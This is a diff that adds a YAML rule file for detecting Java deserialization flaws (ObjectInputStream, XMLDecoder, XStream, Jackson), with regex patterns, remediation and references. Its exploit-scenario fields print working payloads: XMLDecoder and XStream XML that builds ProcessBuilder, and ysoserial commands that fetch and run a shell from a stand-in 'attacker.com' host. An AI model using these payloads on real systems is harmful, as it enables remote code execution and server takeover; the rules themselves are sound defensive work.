@@ -1,0 +1,1618 @@
+rules:
+  # ============================================================================
+  # DESER-JAVA-001: ObjectInputStream.readObject
+  # ============================================================================
+  - rule_id: "DESER-JAVA-001"
+    title: "ObjectInputStream.readObject on Untrusted Data Leading to RCE"
+    description: >
+      Detects usage of Java's ObjectInputStream.readObject() or
+      readUnshared() on data from untrusted sources. Java's native
+      serialization mechanism allows arbitrary object reconstruction
+      including invocation of readObject, readResolve, and finalize
+      methods on deserialized objects. Well-known gadget chains in
+      common libraries (Commons Collections, Spring, Hibernate) enable
+      arbitrary code execution through crafted serialized Java objects.
+      This is the most exploited Java deserialization vulnerability class.
+    language: java
+    category: deserialization
+    severity: Critical
+    confidence: 0.95
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - java
+      - objectinputstream
+      - rce
+      - gadget-chain
+      - critical
+      - ysoserial
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'new\s+ObjectInputStream\s*\(\s*(request\.|socket\.|conn\.|input|stream|data|payload)'
+        description: "ObjectInputStream created from untrusted input stream"
+      - type: regex
+        pattern: '\.readObject\s*\(\s*\)'
+        description: "readObject call on ObjectInputStream"
+      - type: regex
+        pattern: '\.readUnshared\s*\(\s*\)'
+        description: "readUnshared call which also triggers deserialization"
+      - type: regex
+        pattern: 'new\s+ObjectInputStream\s*\(\s*new\s+ByteArrayInputStream\s*\('
+        description: "ObjectInputStream wrapping ByteArrayInputStream"
+      - type: regex
+        pattern: 'ObjectInputStream\s*\(\s*new\s+BufferedInputStream\s*\(\s*(socket|conn|request)\.'
+        description: "Buffered ObjectInputStream from network source"
+      - type: regex
+        pattern: 'ObjectInputStream\s+\w+\s*=\s*new\s+ObjectInputStream'
+        description: "ObjectInputStream variable declaration and instantiation"
+      - type: regex
+        pattern: '(getInputStream|getReader)\s*\(\s*\).*ObjectInputStream'
+        description: "ObjectInputStream from servlet or socket input stream"
+      - type: regex
+        pattern: 'SerializationUtils\.deserialize\s*\('
+        description: "Apache Commons SerializationUtils.deserialize helper"
+    anti_patterns:
+      - 'ObjectInputFilter|setObjectInputFilter|REJECTED'
+      - 'resolveClass\s*\(\s*ObjectStreamClass.*throw'
+      - 'ValidatingObjectInputStream'
+      - 'LookAheadObjectInputStream'
+      - 'SerialKiller'
+      - 'NotSerializableException'
+      - 'readObject.*test|Test.*readObject'
+      - '@Test.*readObject'
+      - 'mock.*ObjectInputStream'
+      - 'ObjectInputStream\s*\(\s*new\s+FileInputStream\s*\(\s*"(config|settings|internal)'
+      - 'whitelistedClasses|allowedClasses'
+      - 'ClassNameValidator'
+      - 'ObjectInputStream\s*\(\s*getResourceAsStream'
+      - 'ObjectInputStream.*hmac|mac\.verify'
+      - 'ObjectInputStream.*signature\.verify'
+    bypass_variants:
+      - description: "Custom ObjectInputStream without resolveClass filtering"
+        pattern: 'extends\s+ObjectInputStream\s*\{(?!.*resolveClass.*throw)'
+      - description: "Using Unsafe.allocateInstance to bypass constructor checks"
+        pattern: 'Unsafe\.getUnsafe\s*\(\s*\)\.allocateInstance'
+      - description: "Wrapping deserialization in privileged action"
+        pattern: 'AccessController\.doPrivileged.*readObject'
+    evasion_indicators:
+      - "Custom ObjectInputStream subclass without class filtering"
+      - "Base64-encoded serialized Java object"
+      - "Serialized object in HTTP header or cookie"
+      - "Java serialization magic bytes (0xACED) in request"
+      - "ysoserial gadget chain payloads"
+    encoding_variants:
+      - type: "base64"
+        pattern: 'Base64\.(getDecoder|decode)\s*\(\s*\)\.decode\s*\(.*ObjectInputStream'
+      - type: "hex"
+        pattern: 'Hex\.decode\s*\(.*ObjectInputStream'
+      - type: "gzip"
+        pattern: 'GZIPInputStream\s*\(.*ObjectInputStream'
+    multi_function_chain_patterns:
+      - "HTTP request -> Base64 decode -> ObjectInputStream -> readObject -> RCE"
+      - "RMI call -> ObjectInputStream -> gadget chain -> code execution"
+      - "JMS message -> ObjectMessage.getObject -> deserialization -> RCE"
+      - "Socket input -> ObjectInputStream -> readObject -> command execution"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Java deserialization gadget chains in classpath libraries enable arbitrary code execution with the JVM process privileges"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HttpServletRequest.getInputStream()"
+        sink: "ObjectInputStream.readObject()"
+        through: "ByteArrayInputStream or BufferedInputStream"
+      - source: "Socket.getInputStream()"
+        sink: "ObjectInputStream.readObject()"
+        through: "Direct stream wrapping"
+      - source: "JMS ObjectMessage"
+        sink: "ObjectMessage.getObject()"
+        through: "JMS consumer deserialization"
+    impact: |
+      Java ObjectInputStream deserialization of untrusted data leads to:
+      - Arbitrary Remote Code Execution via gadget chains (ysoserial)
+      - Full server compromise with JVM process privileges
+      - Data exfiltration from databases and file systems
+      - Lateral movement within the network
+      - Persistent backdoor installation
+      - Denial of Service through resource-intensive object graphs
+    remediation: |
+      1. Use ObjectInputFilter (Java 9+) to whitelist allowed classes:
+         ```java
+         ObjectInputStream ois = new ObjectInputStream(inputStream);
+         ois.setObjectInputFilter(filterInfo -> {
+             if (filterInfo.serialClass() != null) {
+                 String className = filterInfo.serialClass().getName();
+                 if (ALLOWED_CLASSES.contains(className)) {
+                     return ObjectInputFilter.Status.ALLOWED;
+                 }
+                 return ObjectInputFilter.Status.REJECTED;
+             }
+             return ObjectInputFilter.Status.UNDECIDED;
+         });
+         ```
+      2. Use Apache Commons IO ValidatingObjectInputStream:
+         ```java
+         ValidatingObjectInputStream vois = new ValidatingObjectInputStream(inputStream);
+         vois.accept(SafeClass1.class, SafeClass2.class);
+         Object obj = vois.readObject();
+         ```
+      3. Replace Java serialization with JSON (Jackson/Gson) for external APIs.
+      4. Remove unnecessary gadget chain libraries from classpath.
+      5. Implement network-level controls to block serialized Java objects.
+    references:
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://github.com/frohoff/ysoserial"
+      - "https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "ObjectInputStream instantiation in same method"
+        - "readObject call on instance"
+        - "No ObjectInputFilter configuration"
+        - "No resolveClass override with whitelist"
+      taint_source_indicators:
+        - "request.getInputStream()"
+        - "socket.getInputStream()"
+        - "JMS message"
+        - "RMI invocation"
+        - "HTTP request body"
+        - "Cookie value"
+      taint_sink_indicators:
+        - "ObjectInputStream.readObject()"
+        - "ObjectInputStream.readUnshared()"
+        - "SerializationUtils.deserialize()"
+        - "ObjectMessage.getObject()"
+      sanitization_patterns:
+        - "ObjectInputFilter with whitelist"
+        - "ValidatingObjectInputStream"
+        - "resolveClass override with class name check"
+        - "SerialKiller library"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (gadget_chain_present ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Java web application accepts serialized Java objects via an API
+        endpoint for legacy integration. The servlet reads the request body
+        into an ObjectInputStream and calls readObject(). The application
+        has Apache Commons Collections 3.2.1 on the classpath. An attacker
+        generates a ysoserial CommonsCollections1 payload:
+        java -jar ysoserial.jar CommonsCollections1 'curl attacker.com/shell|bash'
+        The attacker sends this as the POST body. readObject() triggers the
+        gadget chain, invoking Runtime.exec with the attacker's command.
+      example_payload: "ysoserial CommonsCollections1 'touch /tmp/pwned'"
+      attacker_objective: "Execute arbitrary OS commands via Java deserialization gadget chains to compromise the server"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JAVA-002"
+        - "DESER-JAVA-003"
+        - "DESER-JAVA-004"
+        - "DESER-JAVA-005"
+
+  # ============================================================================
+  # DESER-JAVA-002: XMLDecoder.readObject
+  # ============================================================================
+  - rule_id: "DESER-JAVA-002"
+    title: "XMLDecoder.readObject Deserialization Leading to Code Execution"
+    description: >
+      Detects usage of java.beans.XMLDecoder to deserialize XML data from
+      untrusted sources. XMLDecoder can instantiate arbitrary Java objects,
+      call methods, and set properties as defined in the XML input. Unlike
+      ObjectInputStream, XMLDecoder uses a human-readable XML format which
+      makes it easier to craft and understand payloads. Attackers can
+      construct XML that invokes ProcessBuilder or Runtime.exec to execute
+      arbitrary commands. This vulnerability class has been exploited in
+      critical CVEs including the Oracle WebLogic Server vulnerabilities.
+    language: java
+    category: deserialization
+    severity: Critical
+    confidence: 0.94
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - java
+      - xmldecoder
+      - rce
+      - weblogic
+      - critical
+      - xml
+    detection_layer: 1
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'new\s+XMLDecoder\s*\(\s*(request\.|socket\.|conn\.|input|stream|data|payload)'
+        description: "XMLDecoder created from untrusted input stream"
+      - type: regex
+        pattern: 'XMLDecoder\s*\(\s*new\s+ByteArrayInputStream\s*\('
+        description: "XMLDecoder wrapping ByteArrayInputStream with potentially untrusted data"
+      - type: regex
+        pattern: 'XMLDecoder\s*\(\s*new\s+BufferedInputStream\s*\(\s*(request|socket|conn)\.'
+        description: "XMLDecoder from buffered network stream"
+      - type: regex
+        pattern: '\.readObject\s*\(\s*\).*XMLDecoder'
+        description: "readObject call on XMLDecoder instance"
+      - type: regex
+        pattern: 'XMLDecoder\s+\w+\s*=\s*new\s+XMLDecoder'
+        description: "XMLDecoder variable declaration"
+      - type: regex
+        pattern: 'XMLDecoder\s*\(\s*getClass\s*\(\s*\)\.getResourceAsStream\s*\(\s*(request\.|param|input)'
+        description: "XMLDecoder from resource stream with user-controlled path"
+    anti_patterns:
+      - 'XMLDecoder\s*\(\s*new\s+FileInputStream\s*\(\s*"(config|settings|internal)'
+      - 'XMLDecoder.*test|Test.*XMLDecoder'
+      - '@Test.*XMLDecoder'
+      - 'mock.*XMLDecoder'
+      - 'XMLDecoder\s*\(\s*getClass\s*\(\s*\)\.getResourceAsStream\s*\(\s*"/'
+      - 'XMLDecoder.*validate'
+      - 'XMLDecoder.*schema'
+      - 'XMLDecoder.*whitelist'
+      - 'XMLDecoder.*sandbox'
+      - 'XMLDecoder.*trusted'
+      - '#.*deprecated.*XMLDecoder'
+      - 'XMLDecoder.*internal'
+      - 'XMLDecoder.*fixture'
+    bypass_variants:
+      - description: "XMLDecoder payload invoking ProcessBuilder"
+        pattern: '<object\s+class\s*=\s*"java\.lang\.ProcessBuilder"'
+      - description: "XMLDecoder payload using Runtime.exec"
+        pattern: '<void\s+method\s*=\s*"exec"'
+      - description: "XMLDecoder with nested object construction for chain execution"
+        pattern: '<object\s+class\s*=\s*"java\.lang\.Runtime".*<void\s+method'
+    evasion_indicators:
+      - "XML with java.beans tags in HTTP request body"
+      - "Content-Type: application/xml with object/void tags"
+      - "ProcessBuilder or Runtime references in XML"
+      - "Base64-encoded XML payload"
+      - "CDATA sections wrapping malicious class names"
+    encoding_variants:
+      - type: "base64_xml"
+        pattern: 'Base64\.(getDecoder|decode).*XMLDecoder'
+      - type: "gzip_xml"
+        pattern: 'GZIPInputStream.*XMLDecoder'
+      - type: "cdata_obfuscation"
+        pattern: '<!\[CDATA\[.*ProcessBuilder.*\]\]>'
+    multi_function_chain_patterns:
+      - "HTTP POST -> XML body -> XMLDecoder -> ProcessBuilder -> command execution"
+      - "File upload -> XML content -> XMLDecoder -> Runtime.exec -> RCE"
+      - "SOAP request -> XML body -> XMLDecoder -> arbitrary object creation"
+      - "WebLogic WLS endpoint -> XMLDecoder -> code execution"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "XMLDecoder reconstructs arbitrary Java objects from XML, enabling direct ProcessBuilder/Runtime.exec invocation for OS command execution"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request body (XML)"
+        sink: "XMLDecoder.readObject()"
+        through: "ByteArrayInputStream wrapping"
+      - source: "SOAP request body"
+        sink: "XMLDecoder.readObject()"
+        through: "XML parsing pipeline"
+      - source: "Uploaded XML file"
+        sink: "XMLDecoder.readObject()"
+        through: "FileInputStream"
+    impact: |
+      XMLDecoder deserialization of untrusted XML leads to:
+      - Direct Remote Code Execution via ProcessBuilder or Runtime.exec
+      - Arbitrary object instantiation and method invocation
+      - File system read/write through crafted object construction
+      - Denial of Service through resource-intensive object graphs
+      - Full server compromise (as seen in WebLogic CVE-2017-10271)
+    remediation: |
+      1. Never use XMLDecoder with untrusted input:
+         ```java
+         // Bad: XMLDecoder on user input
+         XMLDecoder decoder = new XMLDecoder(request.getInputStream());
+
+         // Good: Use Jackson or JAXB with schema validation
+         ObjectMapper mapper = new ObjectMapper();
+         MyDTO dto = mapper.readValue(request.getInputStream(), MyDTO.class);
+         ```
+      2. Replace XMLDecoder with JAXB for XML deserialization:
+         ```java
+         JAXBContext context = JAXBContext.newInstance(MyClass.class);
+         Unmarshaller unmarshaller = context.createUnmarshaller();
+         MyClass obj = (MyClass) unmarshaller.unmarshal(inputStream);
+         ```
+      3. If XMLDecoder must be used, implement a SecurityManager to restrict operations.
+      4. Apply WAF rules to block XML containing java.beans tags.
+      5. Remove XMLDecoder usage from internet-facing endpoints entirely.
+    references:
+      - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-10271"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+      - "https://www.oracle.com/security-alerts/cpujan2018.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - "XMLDecoder instantiation with external input"
+        - "readObject call on XMLDecoder"
+        - "No XML content validation before decoding"
+        - "Servlet or controller handling XML input"
+      taint_source_indicators:
+        - "request.getInputStream()"
+        - "request.getReader()"
+        - "SOAP message body"
+        - "uploaded XML file"
+        - "HTTP POST body"
+      taint_sink_indicators:
+        - "XMLDecoder.readObject()"
+        - "XMLDecoder constructor"
+      sanitization_patterns:
+        - "XML schema validation before XMLDecoder"
+        - "Content-type restriction"
+        - "WAF rules for java.beans XML tags"
+        - "SecurityManager restrictions"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (internet_facing ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A WebLogic server exposes a WLS-WSAT endpoint that processes XML
+        input using XMLDecoder. An attacker sends a POST request containing:
+        <java version="1.8.0" class="java.beans.XMLDecoder">
+          <object class="java.lang.ProcessBuilder">
+            <array class="java.lang.String" length="3">
+              <void index="0"><string>/bin/bash</string></void>
+              <void index="1"><string>-c</string></void>
+              <void index="2"><string>curl attacker.com/shell|bash</string></void>
+            </array>
+            <void method="start"/>
+          </object>
+        </java>
+        XMLDecoder instantiates ProcessBuilder and invokes start(),
+        executing the attacker's reverse shell command.
+      example_payload: '<java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>id</string></void></array><void method="start"/></object></java>'
+      attacker_objective: "Execute OS commands through XMLDecoder by constructing ProcessBuilder objects in XML"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JAVA-001"
+        - "DESER-JAVA-003"
+        - "DESER-JAVA-008"
+
+  # ============================================================================
+  # DESER-JAVA-003: XStream fromXML
+  # ============================================================================
+  - rule_id: "DESER-JAVA-003"
+    title: "XStream fromXML Deserialization Enabling Remote Code Execution"
+    description: >
+      Detects usage of XStream's fromXML method on untrusted input without
+      proper security configuration. XStream is a widely-used XML/JSON
+      serialization library for Java that can reconstruct arbitrary object
+      graphs from XML. Without explicit security configuration (allowTypes,
+      denyTypes, or setupDefaultSecurity), XStream allows deserialization
+      of any class on the classpath, enabling gadget chain attacks similar
+      to those exploitable via ObjectInputStream. Multiple CVEs demonstrate
+      RCE through XStream including CVE-2021-21344 through CVE-2021-21351.
+    language: java
+    category: deserialization
+    severity: Critical
+    confidence: 0.93
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - java
+      - xstream
+      - rce
+      - xml
+      - gadget-chain
+      - critical
+    detection_layer: 1
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'xstream\.fromXML\s*\(\s*(request\.|socket\.|input|stream|data|payload|body|xml|content)'
+        description: "XStream.fromXML on untrusted input"
+      - type: regex
+        pattern: 'new\s+XStream\s*\(\s*\)\s*;(?!.*setupDefaultSecurity|allowTypes|denyPermission)'
+        description: "XStream instantiation without security configuration"
+      - type: regex
+        pattern: 'xstream\.fromXML\s*\(\s*new\s+String(Reader|InputStream)\s*\('
+        description: "XStream.fromXML from reader/stream wrapping user data"
+      - type: regex
+        pattern: 'XStream\s+\w+\s*=\s*new\s+XStream\s*\(\s*(new\s+DomDriver|new\s+StaxDriver|new\s+JettisonMappedXmlDriver)'
+        description: "XStream with various drivers without security setup"
+      - type: regex
+        pattern: 'xstream\.fromXML\s*\(\s*String\.valueOf\s*\('
+        description: "XStream.fromXML after String conversion"
+      - type: regex
+        pattern: 'XStream\.NO_REFERENCES'
+        description: "XStream configured without reference handling (potential bypass)"
+    anti_patterns:
+      - 'xstream\.setupDefaultSecurity'
+      - 'xstream\.allowTypes'
+      - 'xstream\.denyPermission'
+      - 'xstream\.addPermission\s*\(\s*NoTypePermission'
+      - 'xstream\.allowTypesByWildcard'
+      - 'XStream.*test|Test.*XStream'
+      - '@Test.*xstream'
+      - 'mock.*XStream'
+      - 'xstream\.fromXML\s*\(\s*"<'
+      - 'xstream\.fromXML\s*\(\s*getResourceAsStream'
+      - 'xstream\.(setClassLoader|setSecurityManager)'
+      - 'xstream\.fromXML.*schema'
+      - 'xstream.*trusted'
+      - 'xstream.*internal'
+    bypass_variants:
+      - description: "XStream EventHandler gadget chain for RCE"
+        pattern: '<java\.beans\.EventHandler>|<dynamic-proxy>'
+      - description: "XStream with custom converter bypassing type restrictions"
+        pattern: 'xstream\.registerConverter\s*\(\s*new\s+\w+Converter'
+      - description: "Sorted-set or tree-map based gadget chains"
+        pattern: '<sorted-set>|<tree-map>.*<comparator.*class='
+    evasion_indicators:
+      - "XML with XStream-specific type aliases"
+      - "Dynamic proxy elements in XStream XML"
+      - "EventHandler references in XML payload"
+      - "Custom converter that bypasses type restrictions"
+      - "XStream version < 1.4.18 without security hardening"
+    encoding_variants:
+      - type: "base64"
+        pattern: 'Base64\.decode.*xstream\.fromXML'
+      - type: "gzip"
+        pattern: 'GZIPInputStream.*xstream\.fromXML'
+      - type: "json_xstream"
+        pattern: 'JettisonMappedXmlDriver|JsonHierarchicalStreamDriver'
+    multi_function_chain_patterns:
+      - "REST endpoint -> XML body -> XStream.fromXML -> gadget chain -> RCE"
+      - "SOAP service -> XML -> XStream -> object construction -> command execution"
+      - "File upload -> XML content -> XStream.fromXML -> code execution"
+      - "Message queue -> XML payload -> XStream -> deserialization -> RCE"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "XStream without security configuration allows instantiation of any classpath class, enabling gadget chain attacks with full server access"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request body (XML/JSON)"
+        sink: "XStream.fromXML()"
+        through: "Direct string or stream parameter"
+      - source: "File upload content"
+        sink: "XStream.fromXML()"
+        through: "File read to string"
+      - source: "Message queue XML message"
+        sink: "XStream.fromXML()"
+        through: "Consumer callback"
+    impact: |
+      Unrestricted XStream deserialization can lead to:
+      - Remote Code Execution via multiple known gadget chains
+      - Server-Side Request Forgery through URL-based gadgets
+      - Arbitrary file read/write
+      - Denial of Service through recursive XML structures
+      - Complete server compromise
+    remediation: |
+      1. Configure XStream security (v1.4.7+):
+         ```java
+         XStream xstream = new XStream();
+         xstream.addPermission(NoTypePermission.NONE);
+         xstream.addPermission(NullPermission.NULL);
+         xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);
+         xstream.allowTypes(new Class[] { SafeClass.class });
+         ```
+      2. Use setupDefaultSecurity (v1.4.10+):
+         ```java
+         XStream xstream = new XStream();
+         XStream.setupDefaultSecurity(xstream);
+         xstream.allowTypes(new Class[] { SafeClass.class });
+         ```
+      3. Upgrade to XStream 1.4.18+ which has stricter defaults.
+      4. Replace XStream with Jackson or JAXB for XML processing.
+      5. Implement WAF rules to detect XStream gadget chain payloads.
+    references:
+      - "https://x-stream.github.io/security.html"
+      - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21344"
+      - "https://cwe.mitre.org/data/definitions/502.html"
+      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
+    context_awareness:
+      surrounding_context_patterns:
+        - "XStream import and instantiation in same file"
+        - "No setupDefaultSecurity or allowTypes call"
+        - "fromXML with user-controlled parameter"
+        - "No type permission configuration"
+      taint_source_indicators:
+        - "request.getInputStream()"
+        - "request.getParameter()"
+        - "request.getReader()"
+        - "uploaded file content"
+        - "external URL response"
+      taint_sink_indicators:
+        - "xstream.fromXML()"
+        - "xstream.unmarshal()"
+      sanitization_patterns:
+        - "setupDefaultSecurity()"
+        - "addPermission(NoTypePermission.NONE)"
+        - "allowTypes with explicit class list"
+        - "denyPermission for dangerous packages"
+    severity_scoring:
+      severity_weight: 10
+      risk_score_formula_hint: "severity_weight * confidence * (security_configured ? 0.3 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A REST API uses XStream to deserialize XML requests. The XStream
+        instance is created with new XStream() without security configuration.
+        An attacker sends an XML payload containing a dynamic-proxy element
+        that chains through EventHandler to invoke Runtime.exec:
+        <dynamic-proxy>
+          <interface>java.lang.Comparable</interface>
+          <handler class="java.beans.EventHandler">
+            <target class="java.lang.ProcessBuilder">
+              <command><string>curl</string><string>attacker.com/shell</string></command>
+            </target>
+            <action>start</action>
+          </handler>
+        </dynamic-proxy>
+      example_payload: "<dynamic-proxy><interface>java.lang.Comparable</interface><handler class='java.beans.EventHandler'><target class='java.lang.ProcessBuilder'><command><string>id</string></command></target><action>start</action></handler></dynamic-proxy>"
+      attacker_objective: "Exploit XStream's unrestricted type instantiation to execute commands via gadget chains"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "DESER-JAVA-001"
+        - "DESER-JAVA-002"
+        - "DESER-JAVA-004"
+
+  # ============================================================================
+  # DESER-JAVA-004: Jackson Polymorphic Deserialization
+  # ============================================================================
+  - rule_id: "DESER-JAVA-004"
+    title: "Jackson Polymorphic Deserialization via enableDefaultTyping"
+    description: >
+      Detects usage of Jackson's enableDefaultTyping or
+      activateDefaultTyping configurations which enable polymorphic type
+      handling during JSON deserialization. When default typing is enabled,
+      Jackson includes type information in serialized JSON and uses it to
+      instantiate the specified class during deserialization. An attacker
+      can inject type identifiers pointing to dangerous classes on the
+      classpath (gadget classes) to achieve remote code execution. The
+      Jackson maintainers have added a block list of known gadget classes,
+      but new bypasses are regularly discovered.
+    language: java
+    category: deserialization
+    severity: Critical
+    confidence: 0.92
+    cwe: CWE-502
+    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
+    tags:
+      - deserialization
+      - java
+      - jackson
+      - polymorphic
+      - rce
+      - json
+      - default-typing
+      - critical
+    detection_layer: 2
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'enableDefaultTyping\s*\(\s*\)'
+        description: "enableDefaultTyping with no arguments (most permissive)"
+      - type: regex
+        pattern: 'enableDefaultTyping\s*\(\s*ObjectMapper\.DefaultTyping\.(EVERYTHING|NON_FINAL|OBJECT_AND_NON_CONCRETE|NON_CONCRETE_AND_ARRAYS)'
+        description: "enableDefaultTyping with permissive DefaultTyping enum"
+      - type: regex
+        pattern: 'activateDefaultTyping\s*\('
+        description: "activateDefaultTyping (replacement for enableDefaultTyping)"
+      - type: regex
+        pattern: '@JsonTypeInfo\s*\(\s*use\s*=\s*JsonTypeInfo\.Id\.(CLASS|MINIMAL_CLASS)'
+        description: "JsonTypeInfo annotation using CLASS or MINIMAL_CLASS id"
+      - type: regex
+        pattern: 'setDefaultTyping\s*\(\s*new\s+DefaultTypeResolverBuilder'
+        description: "Custom DefaultTypeResolverBuilder configuration"
+      - type: regex
+        pattern: 'ObjectMapper\.DefaultTyping\.EVERYTHING'
+        description: "Most dangerous: default typing for all types"
+      - type: regex
+        pattern: '@JsonTypeInfo.*include\s*=\s*JsonTypeInfo\.As\.(PROPERTY|WRAPPER_ARRAY|WRAPPER_OBJECT)'
+        description: "JsonTypeInfo with type embedding options exploitable with CLASS id"
+    anti_patterns:
+      - '@JsonTypeInfo\s*\(\s*use\s*=\s*JsonTypeInfo\.Id\.NAME'
+      - 'enableDefaultTyping.*JAVA_LANG_OBJECT'
+      - 'PolymorphicTypeValidator'
+      - 'BasicPolymorphicTypeValidator'
+      - 'LaissezFaireSubTypeValidator.*#.*deprecated'
+      - 'activateDefaultTyping\s*\(\s*\w+Validator'
+      - '@Test.*enableDefaultTyping'
+      - 'mock.*ObjectMapper'
+      - '@JsonSubTypes'
+      - 'objectMapper\.registerSubtypes'
+      - 'DefaultTyping.*//.*disabled'
+      - 'enableDefaultTyping.*//.*removed'
+      - '#.*TODO.*remove.*enableDefaultTyping'
+    bypass_variants:
+      - description: "Jackson gadget via JNDI lookup class"
+        pattern: '\\["org\\.apache\\.xbean\\.propertyeditor\\.JndiConverter"'
+      - description: "Type confusion via wrapper array format"
+        pattern: '\\[\s*"[a-z]+\\.[a-z]+\\.[A-Z]'
+      - description: "Jackson gadget through Spring class instantiation"
+        pattern: '\\["org\\.springframework\\.(beans|context)\\.'
+    evasion_indicators:
+      - "JSON with array-wrapped type identifiers"
+      - "Polymorphic type hints in JSON payload"
+      - "Class names from known gadget packages in JSON"
+      - "Custom ObjectMapper with permissive type handling"
+      - "Jackson version with incomplete gadget blocklist"
+    encoding_variants:
+      - type: "unicode_class_name"
+        pattern: '\\u006f\\u0072\\u0067\\u002e\\u0061\\u0070\\u0061'
+      - type: "array_format"
+        pattern: '\\[\s*"[a-zA-Z]+\\.[a-zA-Z]+\\.'
+      - type: "property_format"
+        pattern: '"@class"\s*:\s*"[a-zA-Z]+\\.[a-zA-Z]+\\.'
+    multi_function_chain_patterns:
+      - "REST endpoint -> Jackson deserialization -> JNDI lookup -> RCE"
+      - "JSON API -> polymorphic type -> gadget class instantiation -> command execution"
+      - "WebSocket message -> Jackson readValue -> class instantiation -> SSRF"
+      - "Message queue -> Jackson deserialization -> type confusion -> data access"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Jackson polymorphic deserialization with default typing allows attacker-specified class instantiation, enabling JNDI/RMI-based RCE through gadget classes"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request body (JSON)"
+        sink: "ObjectMapper.readValue() with enableDefaultTyping"
+        through: "Spring MVC request binding"
+      - source: "Kafka message JSON payload"
+        sink: "ObjectMapper.readValue()"
+        through: "Kafka consumer deserializer"
+      - source: "Redis cached JSON string"
+        sink: "ObjectMapper.readValue()"
+        through: "Cache get operation"
+    impact: |
+      Jackson polymorphic deserialization can lead to:
+      - Remote Code Execution via JNDI injection through gadget classes
+      - Server-Side Request Forgery through URL-based gadgets
+      - Arbitrary class instantiation and method invocation
+      - Information disclosure through crafted type hierarchies
+      - Supply chain attacks through transitive dependency gadgets
+    remediation: |
+      1. Never use enableDefaultTyping. Use explicit @JsonTypeInfo with NAME:
+         ```java
+         @JsonTypeInfo(use = JsonTypeInfo.Id.NAME,
+                       include = JsonTypeInfo.As.PROPERTY,
+                       property = "type")
+         @JsonSubTypes({
+             @JsonSubTypes.Type(value = Dog.class, name = "dog"),
+             @JsonSubTypes.Type(value = Cat.class, name = "cat")
+         })
+         public abstract class Animal { }
+         ```
+      2. If default typing is required, use PolymorphicTypeValidator (2.10+):
+         ```java
+         ObjectMapper mapper = new ObjectMapper();
+         mapper.activateDefaultTyping(
+             BasicPolymorphicTypeValidator.builder()
+                 .allowIfSubType("com.myapp.model.")
+                 .build(),
+             ObjectMapper.DefaultTyping.NON_FINAL
+         );
+         ```
+      3. Upgrade Jackson to latest version for updated gadget blocklist.
+      4. Audit classpath for known gadget chain libraries.
+      5. Use Jackson's MixIn annotations for controlled type information.
+    references:
+      - "https://github.com/FasterXML/jackson-databind/issues/2032"
+      - "https://cwe.mitre.org/data/definitions/502.html"
